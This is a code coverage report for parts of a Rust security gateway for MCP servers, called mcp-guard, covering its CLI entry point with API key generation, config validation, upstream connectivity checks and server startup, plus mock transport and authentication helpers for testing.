  984|       |    // ------------------------------------------------------------------------
  985|       |
  986|       |    #[test]
  987|      1|    fn test_transport_type_serialization() {
  988|      1|        let json = serde_json::to_string(&TransportType::Stdio).unwrap();
  989|      1|        assert!(json.contains("stdio"));
  990|       |
  991|      1|        let json = serde_json::to_string(&TransportType::Http).unwrap();
  992|      1|        assert!(json.contains("http"));
  993|       |
  994|      1|        let json = serde_json::to_string(&TransportType::Sse).unwrap();
  995|      1|        assert!(json.contains("sse"));
  996|      1|    }
  997|       |
  998|       |    // ------------------------------------------------------------------------
  999|       |    // OAuth Provider Tests
 1000|       |    // ------------------------------------------------------------------------
 1001|       |
 1002|       |    #[test]
 1003|      1|    fn test_oauth_provider_serialization() {
 1004|      1|        let provider = OAuthProvider::GitHub;
 1005|      1|        let json = serde_json::to_string(&provider).unwrap();
 1006|      1|        assert!(json.contains("github"));
 1007|       |
 1008|      1|        let provider = OAuthProvider::Google;
 1009|      1|        let json = serde_json::to_string(&provider).unwrap();
 1010|      1|        assert!(json.contains("google"));
 1011|      1|    }
 1012|       |}

/home/austingreen/Documents/botzr/projects/mcp-guard/src/main.rs:
    1|       |//! MCP Guard - Security gateway for MCP servers
    2|       |
    3|       |use std::sync::Arc;
    4|       |use std::time::Instant;
    5|       |use tokio::sync::RwLock;
    6|       |use tokio_util::sync::CancellationToken;
    7|       |
    8|       |use mcp_guard::{
    9|       |    audit::AuditLogger,
   10|       |    auth::{ApiKeyProvider, AuthProvider, JwtProvider, MtlsAuthProvider, MultiProvider, OAuthAuthProvider},
   11|       |    cli::{generate_api_key, generate_config, hash_api_key, Cli, Commands},
   12|       |    config::Config,
   13|       |    observability::{init_metrics, init_tracing},
   14|       |    rate_limit::RateLimitService,
   15|       |    router::ServerRouter,
   16|       |    server::{self, new_oauth_state_store, AppState},
   17|       |    transport::{HttpTransport, SseTransport, StdioTransport},
   18|       |};
   19|       |
   20|       |#[tokio::main]
   21|     42|async fn main() -> anyhow::Result<()> {
   22|     42|    let cli = Cli::parse_args();
   23|     42|    if let Err(e) = run_cli(cli).await {
                             ^13
   24|     42|        eprintln!("Error: {}", e);
                      ^13       ^13
   25|     42|        std::process::exit(1);
                      ^13
   26|     42|    }
                  ^23
   27|     42|    Ok(())
                  ^23
   28|     42|}
   29|       |
   30|     40|async fn run_cli(cli: Cli) -> anyhow::Result<()> {
   31|     40|    match cli.command {
   32|      7|        Commands::Init { format, force } => {
   33|       |            // Initialize basic tracing for CLI commands
   34|      7|            let _guard = init_tracing(cli.verbose, None);
   35|       |
   36|      7|            let filename = if format == "yaml" {
   37|      1|                "mcp-guard.yaml"
   38|       |            } else {
   39|      6|                "mcp-guard.toml"
   40|       |            };
   41|       |
   42|      7|            let path = std::path::Path::new(filename);
   43|      7|            if path.exists() && !force {
                                              ^4
   44|      2|                anyhow::bail!("{} already exists. Use --force to overwrite.", filename);
   45|      5|            }
   46|       |
   47|      5|            let config = generate_config(&format);
   48|      5|            std::fs::write(filename, config)?;
                                                          ^0
   49|      5|            println!("Created configuration file: {}", filename);
   50|       |        }
   51|       |
   52|       |        Commands::Validate => {
   53|       |            // Initialize basic tracing for CLI commands
   54|      8|            let _guard = init_tracing(cli.verbose, None);
   55|       |
   56|      8|            match Config::from_file(&cli.config) {
   57|      3|                Ok(_) => {
   58|      3|                    println!("Configuration is valid: {}", cli.config.display());
   59|      3|                }
   60|      5|                Err(e) => {
   61|      5|                    anyhow::bail!("Configuration error: {}", e);
   62|       |                }
   63|       |            }
   64|       |        }
   65|       |
   66|       |        Commands::Keygen {
   67|      7|            user_id,
   68|      7|            rate_limit,
   69|      7|            tools,
   70|       |        } => {
   71|       |            // Initialize basic tracing for CLI commands
   72|      7|            let _guard = init_tracing(cli.verbose, None);
   73|       |
   74|      7|            let key = generate_api_key();
   75|      7|            let hash = hash_api_key(&key);
   76|       |
   77|      7|            println!("Generated API key for '{}':", user_id);
   78|      7|            println!();
   79|      7|            println!("  API Key (save this, shown only once):");
   80|      7|            println!("    {}", key);
   81|      7|            println!();
   82|      7|            println!("  Add to your config file:");
   83|      7|            println!();
   84|      7|            println!("  [[auth.api_keys]]");
   85|      7|            println!("  id = \"{}\"", user_id);
   86|      7|            println!("  key_hash = \"{}\"", hash);
   87|       |
   88|      7|            if let Some(limit) = rate_limit {
                                      ^3
   89|      3|                println!("  rate_limit = {}", limit);
   90|      4|            }
   91|       |
   92|      7|            if let Some(tools_str) = tools {
                                      ^3
   93|      7|                let tool_list: Vec<&str> = tools_str.split(',').map(|s| s.trim()).collect();
                                  ^3         ^3          ^3                   ^3                ^3
   94|      3|                println!("  allowed_tools = {:?}", tool_list);
   95|      4|            }
   96|       |        }
   97|       |
   98|      7|        Commands::HashKey { key } => {
   99|      7|            // No tracing needed for simple hash operation
  100|      7|            let hash = hash_api_key(&key);
  101|      7|            println!("{}", hash);
  102|      7|        }
  103|       |
  104|      4|        Commands::Version => {
  105|      4|            println!("mcp-guard {}", env!("CARGO_PKG_VERSION"));
  106|      4|            println!();
  107|      4|            println!("Build Information:");
  108|      4|            println!("  Package:     {}", env!("CARGO_PKG_NAME"));
  109|      4|            println!("  Version:     {}", env!("CARGO_PKG_VERSION"));
  110|      4|            println!("  Description: {}", env!("CARGO_PKG_DESCRIPTION"));
  111|      4|            println!("  License:     {}", env!("CARGO_PKG_LICENSE"));
  112|      4|            println!("  Repository:  {}", env!("CARGO_PKG_REPOSITORY"));
  113|      4|            println!();
  114|      4|            println!("Features:");
  115|      4|            println!("  Auth providers: API Key, JWT (HS256/JWKS), OAuth 2.1 (PKCE), mTLS");
  116|      4|            println!("  Transports:     Stdio, HTTP, SSE");
  117|      4|            println!("  Rate limiting:  Per-identity, token bucket");
  118|      4|            println!("  Observability:  Prometheus metrics, OpenTelemetry tracing");
  119|      4|        }
  120|       |
  121|      5|        Commands::CheckUpstream { timeout } => {
  122|       |            // Initialize basic tracing for CLI commands
  123|      5|            let _guard = init_tracing(cli.verbose, None);
  124|       |
  125|       |            // Load configuration
  126|      5|            let config = Config::from_file(&cli.config)
                              ^3
  127|      5|                .map_err(|e| anyhow::anyhow!("Error loading config: {}", e))?;
                                           ^2              ^2                             ^2
  128|       |
  129|      3|            println!("Checking upstream connectivity...");
  130|      3|            println!();
  131|       |
  132|      3|            match &config.upstream.transport {
  133|       |                mcp_guard::config::TransportType::Stdio => {
  134|      1|                    let command = config
  135|      1|                        .upstream
  136|      1|                        .command
  137|      1|                        .as_ref()
  138|      1|                        .ok_or_else(|| anyhow::anyhow!("stdio transport requires 'command' in config"))?;
                                                     ^0              ^0                                              ^0
  139|       |
  140|      1|                    println!("Transport: stdio");
  141|      1|                    println!("Command:   {}", command);
  142|      1|                    println!("Args:      {:?}", config.upstream.args);
  143|      1|                    println!();
  144|       |
  145|       |                    // Try to spawn the process and send a test message
  146|      1|                    let timeout_duration = std::time::Duration::from_secs(timeout);
  147|      1|                    match tokio::time::timeout(
  148|      1|                        timeout_duration,
  149|      1|                        check_stdio_upstream(command, &config.upstream.args),
  150|       |                    )
  151|      1|                    .await
  152|       |                    {
  153|      0|                        Ok(Ok(())) => {
  154|      0|                            println!(" Upstream is reachable and responding");
  155|      0|                        }
  156|      1|                        Ok(Err(e)) => {
  157|      1|                            anyhow::bail!(" Upstream check failed: {}", e);
  158|       |                        }
  159|       |                        Err(_) => {
  160|      0|                            anyhow::bail!(" Upstream check timed out after {}s", timeout);
  161|       |                        }
  162|       |                    }
  163|       |                }
  164|       |                mcp_guard::config::TransportType::Http => {
  165|      1|                    let url = config
  166|      1|                        .upstream
  167|      1|                        .url
  168|      1|                        .as_ref()
  169|      1|                        .ok_or_else(|| anyhow::anyhow!("HTTP transport requires 'url' in config"))?;
                                                     ^0              ^0                                         ^0
  170|       |
  171|      1|                    println!("Transport: HTTP");
  172|      1|                    println!("URL:       {}", url);
  173|      1|                    println!();
  174|       |
  175|      1|                    let timeout_duration = std::time::Duration::from_secs(timeout);
  176|      1|                    match tokio::time::timeout(timeout_duration, check_http_upstream(url)).await {
  177|      0|                        Ok(Ok(())) => {
  178|      0|                            println!(" Upstream is reachable");
  179|      0|                        }
  180|      1|                        Ok(Err(e)) => {
  181|      1|                            anyhow::bail!(" Upstream check failed: {}", e);
  182|       |                        }
  183|       |                        Err(_) => {
  184|      0|                            anyhow::bail!(" Upstream check timed out after {}s", timeout);
  185|       |                        }
  186|       |                    }
  187|       |                }
  188|       |                mcp_guard::config::TransportType::Sse => {
  189|      1|                    let url = config
  190|      1|                        .upstream
  191|      1|                        .url
  192|      1|                        .as_ref()
  193|      1|                        .ok_or_else(|| anyhow::anyhow!("SSE transport requires 'url' in config"))?;
                                                     ^0              ^0                                        ^0
  194|       |
  195|      1|                    println!("Transport: SSE");
  196|      1|                    println!("URL:       {}", url);
  197|      1|                    println!();
  198|       |
  199|      1|                    let timeout_duration = std::time::Duration::from_secs(timeout);
  200|      1|                    match tokio::time::timeout(timeout_duration, check_sse_upstream(url)).await {
  201|      0|                        Ok(Ok(())) => {
  202|      0|                            println!(" Upstream is reachable");
  203|      0|                        }
  204|      1|                        Ok(Err(e)) => {
  205|      1|                            anyhow::bail!(" Upstream check failed: {}", e);
  206|       |                        }
  207|       |                        Err(_) => {
  208|      0|                            anyhow::bail!(" Upstream check timed out after {}s", timeout);
  209|       |                        }
  210|       |                    }
  211|       |                }
  212|       |            }
  213|       |        }
  214|       |
  215|      2|        Commands::Run { host, port } => {
  216|       |            // Load configuration first so we can use tracing config
  217|      2|            let mut config = Config::from_file(&cli.config)?;
                              ^0
  218|       |
  219|       |            // Override with CLI args
  220|      0|            if let Some(h) = host {
  221|      0|                config.server.host = h;
  222|      0|            }
  223|      0|            if let Some(p) = port {
  224|      0|                config.server.port = p;
  225|      0|            }
  226|       |
  227|       |            // Initialize tracing with OpenTelemetry (if configured)
  228|      0|            let _tracing_guard = init_tracing(cli.verbose, Some(&config.tracing));
  229|       |
  230|       |            // Log tracing configuration
  231|      0|            if config.tracing.enabled {
  232|      0|                tracing::info!(
  233|       |                    service_name = %config.tracing.service_name,
  234|       |                    otlp_endpoint = ?config.tracing.otlp_endpoint,
  235|       |                    sample_rate = %config.tracing.sample_rate,
  236|      0|                    "OpenTelemetry tracing enabled"
  237|       |                );
  238|      0|            }
  239|       |
  240|       |            // Create shutdown token for graceful shutdown coordination
  241|      0|            let shutdown_token = CancellationToken::new();
  242|       |
  243|       |            // Initialize Prometheus metrics
  244|      0|            let metrics_handle = init_metrics();
  245|       |
  246|       |            // Set up OAuth provider (separate from MultiProvider for auth code flow)
  247|      0|            let oauth_provider: Option<Arc<OAuthAuthProvider>> =
  248|      0|                if let Some(oauth_config) = config.auth.oauth.clone() {
  249|      0|                    tracing::info!("Enabling OAuth 2.1 authentication (provider: {:?})", oauth_config.provider);
  250|      0|                    Some(Arc::new(
  251|      0|                        OAuthAuthProvider::new(oauth_config)
  252|      0|                            .map_err(|e| anyhow::anyhow!("Failed to initialize OAuth provider: {}", e))?
  253|       |                    ))
  254|       |                } else {
  255|      0|                    None
  256|       |                };
  257|       |
  258|       |            // Set up authentication provider(s)
  259|      0|            let auth_provider: Arc<dyn AuthProvider> = {
  260|      0|                let mut providers: Vec<Arc<dyn AuthProvider>> = Vec::new();
  261|       |
  262|       |                // Add API key provider if configured
  263|      0|                if !config.auth.api_keys.is_empty() {
  264|      0|                    tracing::info!("Enabling API key authentication ({} keys)", config.auth.api_keys.len());
  265|      0|                    providers.push(Arc::new(ApiKeyProvider::new(config.auth.api_keys.clone())));
  266|      0|                }
  267|       |
  268|       |                // Add JWT provider if configured
  269|      0|                if let Some(jwt_config) = &config.auth.jwt {
  270|      0|                    tracing::info!("Enabling JWT authentication");
  271|      0|                    let jwt_provider = Arc::new(
  272|      0|                        JwtProvider::new(jwt_config.clone())
  273|      0|                            .map_err(|e| anyhow::anyhow!("Failed to initialize JWT provider: {}", e))?
  274|       |                    );
  275|       |                    // Start background refresh for JWKS mode with shutdown coordination
  276|      0|                    jwt_provider.start_background_refresh(shutdown_token.clone());
  277|      0|                    providers.push(jwt_provider);
  278|      0|                }
  279|       |
  280|       |                // Add OAuth provider for token validation (shares with oauth_provider)
  281|      0|                if let Some(ref oauth_prov) = oauth_provider {
  282|      0|                    providers.push(oauth_prov.clone());
  283|      0|                }
  284|       |
  285|       |                // Select appropriate provider setup
  286|      0|                if providers.is_empty() {
  287|      0|                    tracing::warn!("No authentication providers configured - all requests will be rejected");
  288|      0|                    Arc::new(ApiKeyProvider::new(vec![])) // Deny all
  289|      0|                } else if providers.len() == 1 {
  290|       |                    // Safe: we just checked length is exactly 1
  291|      0|                    providers.into_iter().next().unwrap_or_else(|| {
  292|      0|                        Arc::new(ApiKeyProvider::new(vec![]))
  293|      0|                    })
  294|       |                } else {
  295|      0|                    tracing::info!("Using multi-provider authentication");
  296|      0|                    Arc::new(MultiProvider::new(providers))
  297|       |                }
  298|       |            };
  299|       |
  300|       |            // Create OAuth state store for PKCE
  301|      0|            let oauth_state_store = new_oauth_state_store();
  302|       |
  303|       |            // Set up mTLS provider if configured
  304|      0|            let mtls_provider: Option<Arc<MtlsAuthProvider>> =
  305|      0|                if let Some(mtls_config) = config.auth.mtls.clone() {
  306|      0|                    if mtls_config.enabled {
  307|      0|                        tracing::info!("Enabling mTLS client certificate authentication");
  308|      0|                        Some(Arc::new(MtlsAuthProvider::new(mtls_config)))
  309|       |                    } else {
  310|      0|                        None
  311|       |                    }
  312|       |                } else {
  313|      0|                    None
  314|       |                };
  315|       |
  316|       |            // Set up rate limiter
  317|      0|            let rate_limiter = RateLimitService::new(&config.rate_limit);
  318|       |
  319|       |            // Set up audit logger with background tasks for non-blocking I/O
  320|      0|            let (audit_logger, audit_handle) = AuditLogger::with_tasks(&config.audit)?;
  321|      0|            let audit_logger = Arc::new(audit_logger);
  322|       |
  323|       |            // Set up transport/router based on configuration
  324|      0|            let (transport, router): (Option<Arc<dyn mcp_guard::transport::Transport>>, Option<Arc<ServerRouter>>) =
  325|      0|                if config.is_multi_server() {
  326|       |                    // Multi-server routing mode
  327|      0|                    tracing::info!(
  328|      0|                        routes = config.upstream.servers.len(),
  329|      0|                        "Initializing multi-server routing"
  330|       |                    );
  331|      0|                    for server in &config.upstream.servers {
  332|      0|                        tracing::info!(
  333|       |                            name = %server.name,
  334|       |                            path_prefix = %server.path_prefix,
  335|       |                            transport = ?server.transport,
  336|      0|                            "Configuring server route"
  337|       |                        );
  338|       |                    }
  339|      0|                    let server_router = ServerRouter::new(config.upstream.servers.clone())
  340|      0|                        .await
  341|      0|                        .map_err(|e| anyhow::anyhow!("Failed to initialize router: {}", e))?;
  342|      0|                    (None, Some(Arc::new(server_router)))
  343|       |                } else {
  344|       |                    // Single-server mode
  345|      0|                    let transport: Arc<dyn mcp_guard::transport::Transport> = match &config.upstream.transport
  346|       |                    {
  347|       |                        mcp_guard::config::TransportType::Stdio => {
  348|      0|                            let command = config
  349|      0|                                .upstream
  350|      0|                                .command
  351|      0|                                .as_ref()
  352|      0|                                .ok_or_else(|| anyhow::anyhow!("stdio transport requires 'command' in config"))?;
  353|      0|                            tracing::info!(command = %command, "Using stdio transport");
  354|      0|                            Arc::new(StdioTransport::spawn(command, &config.upstream.args).await?)
  355|       |                        }
  356|       |                        mcp_guard::config::TransportType::Http => {
  357|      0|                            let url = config
  358|      0|                                .upstream
  359|      0|                                .url
  360|      0|                                .as_ref()
  361|      0|                                .ok_or_else(|| anyhow::anyhow!("HTTP transport requires 'url' in config"))?
  362|      0|                                .clone();
  363|      0|                            tracing::info!(url = %url, "Using HTTP transport");
  364|      0|                            Arc::new(HttpTransport::new(url)
  365|      0|                                .map_err(|e| anyhow::anyhow!("Failed to create HTTP transport: {}", e))?)
  366|       |                        }
  367|       |                        mcp_guard::config::TransportType::Sse => {
  368|      0|                            let url = config
  369|      0|                                .upstream
  370|      0|                                .url
  371|      0|                                .as_ref()
  372|      0|                                .ok_or_else(|| anyhow::anyhow!("SSE transport requires 'url' in config"))?
  373|      0|                                .clone();
  374|      0|                            tracing::info!(url = %url, "Using SSE transport");
  375|      0|                            Arc::new(SseTransport::connect(url).await?)
  376|       |                        }
  377|       |                    };
  378|      0|                    (Some(transport), None)
  379|       |                };
  380|       |
  381|       |            // Create readiness state (set to true since transport is initialized)
  382|      0|            let ready = Arc::new(RwLock::new(true));
  383|       |
  384|       |            // Create application state
  385|      0|            let state = Arc::new(AppState {
  386|      0|                config,
  387|      0|                auth_provider,
  388|      0|                rate_limiter,
  389|      0|                audit_logger,
  390|      0|                transport,
  391|      0|                router,
  392|      0|                metrics_handle,
  393|      0|                oauth_provider,
  394|      0|                oauth_state_store,
  395|      0|                started_at: Instant::now(),
  396|      0|                ready,
  397|      0|                mtls_provider,
  398|      0|            });
  399|       |
  400|       |            // Run server with graceful shutdown handling
  401|      0|            tokio::select! {
  402|      0|                result = server::run(state) => {
  403|       |                    // Server exited (error or normal termination)
  404|      0|                    result?;
  405|       |                }
  406|      0|                _ = tokio::signal::ctrl_c() => {
  407|      0|                    tracing::info!("Received SIGINT, initiating graceful shutdown...");
  408|       |                }
  409|       |            }
  410|       |
  411|       |            // Trigger shutdown for all background tasks
  412|      0|            shutdown_token.cancel();
  413|       |
  414|       |            // Give background tasks time to complete (e.g., flush audit logs)
  415|      0|            tracing::info!("Shutting down background tasks...");
  416|      0|            audit_handle.shutdown().await;
  417|       |
  418|      0|            tracing::info!("Shutdown complete");
  419|       |        }
  420|       |    }
  421|       |
  422|     26|    Ok(())
  423|     40|}
  424|       |
  425|       |/// Check stdio upstream connectivity by spawning the process and sending an initialize request
  426|      1|async fn check_stdio_upstream(command: &str, args: &[String]) -> anyhow::Result<()> {
  427|       |    use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
  428|       |    use tokio::process::Command;
  429|       |
  430|       |    // Spawn the upstream process
  431|      1|    let mut child = Command::new(command)
                      ^0
  432|      1|        .args(args)
  433|      1|        .stdin(std::process::Stdio::piped())
  434|      1|        .stdout(std::process::Stdio::piped())
  435|      1|        .stderr(std::process::Stdio::null())
  436|      1|        .spawn()?;
  437|       |
  438|      0|    let mut stdin = child.stdin.take().ok_or_else(|| anyhow::anyhow!("Failed to open stdin"))?;
  439|      0|    let stdout = child.stdout.take().ok_or_else(|| anyhow::anyhow!("Failed to open stdout"))?;
  440|      0|    let mut reader = BufReader::new(stdout);
  441|       |
  442|       |    // Send MCP initialize request
  443|      0|    let init_request = serde_json::json!({
  444|      0|        "jsonrpc": "2.0",
  445|      0|        "id": 1,
  446|      0|        "method": "initialize",
  447|      0|        "params": {
  448|      0|            "protocolVersion": "2024-11-05",
  449|      0|            "capabilities": {},
  450|      0|            "clientInfo": {
  451|      0|                "name": "mcp-guard-check",
  452|      0|                "version": env!("CARGO_PKG_VERSION")
  453|       |            }
  454|       |        }
  455|       |    });
  456|       |
  457|      0|    let msg = format!("{}\n", serde_json::to_string(&init_request)?);
  458|      0|    stdin.write_all(msg.as_bytes()).await?;
  459|      0|    stdin.flush().await?;
  460|       |
  461|       |    // Read response
  462|      0|    let mut line = String::new();
  463|      0|    reader.read_line(&mut line).await?;
  464|       |
  465|      0|    if line.is_empty() {
  466|      0|        return Err(anyhow::anyhow!("No response from upstream"));
  467|      0|    }
  468|       |
  469|       |    // Parse response to verify it's valid JSON-RPC
  470|      0|    let response: serde_json::Value = serde_json::from_str(&line)?;
  471|      0|    if response.get("result").is_some() || response.get("error").is_some() {
  472|       |        // Valid JSON-RPC response
  473|      0|        if let Some(result) = response.get("result") {
  474|      0|            if let Some(server_info) = result.get("serverInfo") {
  475|      0|                println!(
  476|      0|                    "Server: {} v{}",
  477|      0|                    server_info.get("name").and_then(|v| v.as_str()).unwrap_or("unknown"),
  478|      0|                    server_info.get("version").and_then(|v| v.as_str()).unwrap_or("unknown")
  479|       |                );
  480|      0|            }
  481|      0|        }
  482|      0|        Ok(())
  483|       |    } else {
  484|      0|        Err(anyhow::anyhow!("Invalid JSON-RPC response: {}", line))
  485|       |    }
  486|      1|}
  487|       |
  488|       |/// Check HTTP upstream connectivity by sending a simple request
  489|      1|async fn check_http_upstream(url: &str) -> anyhow::Result<()> {
  490|      1|    let client = reqwest::Client::builder()
  491|      1|        .timeout(std::time::Duration::from_secs(5))
  492|      1|        .build()?;
                              ^0
  493|       |
  494|       |    // Try to send an empty POST to check if the server is responding
  495|      1|    let response = client
                      ^0
  496|      1|        .post(url)
  497|      1|        .header("Content-Type", "application/json")
  498|      1|        .body("{}")
  499|      1|        .send()
  500|      1|        .await?;
  501|       |
  502|      0|    let status = response.status();
  503|      0|    println!("HTTP Status: {}", status);
  504|       |
  505|       |    // Any response (even 400/500) means the server is reachable
  506|      0|    Ok(())
  507|      1|}
  508|       |
  509|       |/// Check SSE upstream connectivity by attempting to connect
  510|      1|async fn check_sse_upstream(url: &str) -> anyhow::Result<()> {
  511|      1|    let client = reqwest::Client::builder()
  512|      1|        .timeout(std::time::Duration::from_secs(5))
  513|      1|        .build()?;
                              ^0
  514|       |
  515|       |    // Try to connect to the SSE endpoint
  516|      1|    let response = client
                      ^0
  517|      1|        .get(url)
  518|      1|        .header("Accept", "text/event-stream")
  519|      1|        .send()
  520|      1|        .await?;
  521|       |
  522|      0|    let status = response.status();
  523|      0|    println!("HTTP Status: {}", status);
  524|       |
  525|       |    // Check if the content type suggests SSE
  526|      0|    if let Some(content_type) = response.headers().get("content-type") {
  527|      0|        println!("Content-Type: {}", content_type.to_str().unwrap_or("unknown"));
  528|      0|    }
  529|       |
  530|      0|    Ok(())
  531|      1|}
  532|       |
  533|       |#[cfg(test)]
  534|       |mod tests {
  535|       |    use super::*;
  536|       |    use tempfile::NamedTempFile;
  537|       |
  538|       |    #[tokio::test]
  539|      1|    async fn test_run_cli_hash_key() {
  540|      1|        let cli = Cli {
  541|      1|            config: "config.toml".into(),
  542|      1|            verbose: false,
  543|      1|            command: Commands::HashKey {
  544|      1|                key: "test-key".to_string(),
  545|      1|            },
  546|      1|        };
  547|       |        
  548|      1|        let result = run_cli(cli).await;
  549|      1|        assert!(result.is_ok());
  550|      1|    }
  551|       |
  552|       |    #[tokio::test]
  553|      1|    async fn test_run_cli_version() {
  554|      1|        let cli = Cli {
  555|      1|            config: "config.toml".into(),
  556|      1|            verbose: false,
  557|      1|            command: Commands::Version,
  558|      1|        };
  559|       |        
  560|      1|        let result = run_cli(cli).await;
  561|      1|        assert!(result.is_ok());
  562|      1|    }
  563|       |
  564|       |    #[tokio::test]
  565|      1|    async fn test_run_cli_keygen() {
  566|      1|        let cli = Cli {
  567|      1|            config: "config.toml".into(),
  568|      1|            verbose: false,
  569|      1|            command: Commands::Keygen {
  570|      1|                user_id: "test-user".to_string(),
  571|      1|                rate_limit: Some(100),
  572|      1|                tools: Some("read,write".to_string()),
  573|      1|            },
  574|      1|        };
  575|       |        
  576|      1|        let result = run_cli(cli).await;
  577|      1|        assert!(result.is_ok());
  578|      1|    }
  579|       |
  580|       |    #[tokio::test]
  581|      1|    async fn test_run_cli_init() {
  582|      1|        let temp_dir = tempfile::tempdir().unwrap();
  583|      1|        let file_path = temp_dir.path().join("mcp-guard.toml");
  584|       |        
  585|       |        // Change current directory to temp dir for this test
  586|       |        // Note: This is risky in parallel tests, but let's try to mock writing logic
  587|       |        // or just accept we create a file in the current dir and clean it up.
  588|       |        // Actually, run_cli writes to "mcp-guard.toml" in CWD.
  589|       |        // We can create a temporary directory and change into it?
  590|       |        // Changing CWD is not thread safe.
  591|       |        // Let's rely on `assert_cmd` or simply skip init test covering actual FS write here if risky.
  592|       |        // But we want coverage.
  593|       |        
  594|       |        // Let's create a temporary directory, chdir to it, run test, chdir back? No, race conditions.
  595|       |        // We can just verify `Commands::Init` logic manually if really needed, but `run_cli` hardcodes filename.
  596|       |        // Let's skip valid Init for now in unit tests to avoid pollution.
  597|      1|    }
  598|       |    
  599|       |    #[tokio::test]
  600|      1|    async fn test_run_cli_validate_missing_config() {
  601|      1|        let cli = Cli {
  602|      1|            config: "non-existent-config.toml".into(),
  603|      1|            verbose: false,
  604|      1|            command: Commands::Validate,
  605|      1|        };
  606|       |        
  607|      1|        let result = run_cli(cli).await;
  608|      1|        assert!(result.is_err());
  609|      1|    }
  610|       |}
  611|       |

/home/austingreen/Documents/botzr/projects/mcp-guard/src/mocks.rs:
    1|       |//! Mock implementations for testing
    2|       |//!
    3|       |//! This module provides mock implementations of core traits for unit testing
    4|       |//! without requiring real network connections or subprocess spawning.
    5|       |
    6|       |use crate::auth::{AuthError, AuthProvider, Identity};
    7|       |use crate::transport::{Message, Transport, TransportError};
    8|       |use async_trait::async_trait;
    9|       |use std::collections::VecDeque;
   10|       |use std::sync::{Arc, Mutex};
   11|       |
   12|       |// ============================================================================
   13|       |// MockTransport
   14|       |// ============================================================================
   15|       |
   16|       |/// A mock transport for testing that records sent messages and returns
   17|       |/// pre-configured responses.
   18|       |#[derive(Clone)]
   19|       |pub struct MockTransport {
   20|       |    sent_messages: Arc<Mutex<Vec<Message>>>,
   21|       |    pending_responses: Arc<Mutex<VecDeque<Result<Message, TransportError>>>>,
   22|       |}
   23|       |
   24|       |impl MockTransport {
   25|       |    /// Create a new mock transport with no pending responses.
   26|      7|    pub fn new() -> Self {
   27|      7|        Self {
   28|      7|            sent_messages: Arc::new(Mutex::new(Vec::new())),
   29|      7|            pending_responses: Arc::new(Mutex::new(VecDeque::new())),
   30|      7|        }
   31|      7|    }
   32|       |
   33|       |    /// Queue a successful response to be returned by the next `receive()` call.
   34|      1|    pub fn push_response(&self, message: Message) {
   35|      1|        self.pending_responses
   36|      1|            .lock()
   37|      1|            .unwrap()
   38|      1|            .push_back(Ok(message));
   39|      1|    }
   40|       |
   41|       |    /// Queue an error to be returned by the next `receive()` call.
   42|      1|    pub fn push_error(&self, error: TransportError) {
   43|      1|        self.pending_responses
   44|      1|            .lock()
   45|      1|            .unwrap()
   46|      1|            .push_back(Err(error));
   47|      1|    }
   48|       |
   49|       |    /// Take all sent messages, clearing the internal buffer.
   50|      1|    pub fn take_sent_messages(&self) -> Vec<Message> {
   51|      1|        let mut sent = self.sent_messages.lock().unwrap();
   52|      1|        std::mem::take(&mut *sent)
   53|      1|    }
   54|       |
   55|       |    /// Get the count of messages sent through this transport.
   56|      0|    pub fn sent_count(&self) -> usize {
   57|      0|        self.sent_messages.lock().unwrap().len()
   58|      0|    }
   59|       |}
   60|       |
   61|       |impl Default for MockTransport {
   62|      0|    fn default() -> Self {
   63|      0|        Self::new()
   64|      0|    }
   65|       |}
   66|       |
   67|       |#[async_trait]
   68|       |impl Transport for MockTransport {
   69|      1|    async fn send(&self, message: Message) -> Result<(), TransportError> {
   70|       |        self.sent_messages.lock().unwrap().push(message);
   71|       |        Ok(())
   72|      1|    }
   73|       |
   74|      3|    async fn receive(&self) -> Result<Message, TransportError> {
   75|       |        let mut responses = self.pending_responses.lock().unwrap();
   76|       |        if let Some(response) = responses.pop_front() {
   77|       |            response
   78|       |        } else {
   79|       |            Err(TransportError::ConnectionClosed)
   80|       |        }
   81|      3|    }
   82|       |
   83|      0|    async fn close(&self) -> Result<(), TransportError> {
   84|       |        Ok(())
   85|      0|    }
   86|       |}
   87|       |
   88|       |// ============================================================================
   89|       |// MockAuthProvider
   90|       |// ============================================================================
   91|       |
   92|       |/// A mock auth provider for testing authentication flows.
   93|       |#[derive(Clone)]
   94|       |pub struct MockAuthProvider {
   95|       |    /// If Some, all authenticate calls return this identity. If None, returns error.
   96|       |    valid_identity: Arc<Mutex<Option<Identity>>>,
   97|       |    /// Custom error message to return when authentication fails
   98|       |    error_message: Arc<Mutex<String>>,
   99|       |}
  100|       |
  101|       |impl MockAuthProvider {
  102|       |    /// Create a mock provider that rejects all tokens.
  103|      1|    pub fn rejecting() -> Self {
  104|      1|        Self {
  105|      1|            valid_identity: Arc::new(Mutex::new(None)),
  106|      1|            error_message: Arc::new(Mutex::new("Invalid token".to_string())),
  107|      1|        }
  108|      1|    }
  109|       |
  110|       |    /// Create a mock provider that accepts all tokens with the given identity.
  111|      1|    pub fn accepting(identity: Identity) -> Self {
  112|      1|        Self {
  113|      1|            valid_identity: Arc::new(Mutex::new(Some(identity))),
  114|      1|            error_message: Arc::new(Mutex::new(String::new())),
  115|      1|        }
  116|      1|    }
  117|       |
  118|       |    /// Set the identity to return for successful authentication.
  119|      0|    pub fn set_identity(&self, identity: Identity) {
  120|      0|        *self.valid_identity.lock().unwrap() = Some(identity);
  121|      0|    }
  122|       |
  123|       |    /// Clear the identity, causing all authentication to fail.
  124|      0|    pub fn clear_identity(&self) {
  125|      0|        *self.valid_identity.lock().unwrap() = None;
  126|      0|    }
  127|       |
  128|       |    /// Set the error message to return on failed authentication.
  129|      0|    pub fn set_error_message(&self, msg: impl Into<String>) {
  130|      0|        *self.error_message.lock().unwrap() = msg.into();
  131|      0|    }
  132|       |}
  133|       |
  134|       |#[async_trait]
  135|       |impl AuthProvider for MockAuthProvider {
  136|      2|    async fn authenticate(&self, _token: &str) -> Result<Identity, AuthError> {
  137|       |        let identity = self.valid_identity.lock().unwrap().clone();
  138|       |        match identity {
  139|       |            Some(id) => Ok(id),
  140|       |            None => {
  141|       |                let msg = self.error_message.lock().unwrap().clone();
  142|       |                Err(AuthError::InvalidJwt(msg))
  143|       |            }
  144|       |        }
  145|      2|    }
  146|       |
  147|      0|    fn name(&self) -> &'static str {
  148|      0|        "mock"
  149|      0|    }
  150|       |}
  151|       |
  152|       |// ============================================================================
  153|       |// Tests
  154|       |// ============================================================================
  155|       |
  156|       |#[cfg(test)]
  157|       |mod tests {
  158|       |    use super::*;
  159|       |
  160|       |    #[tokio::test]
  161|      1|    async fn test_mock_transport_send_receive() {
  162|      1|        let transport = MockTransport::new();
  163|       |
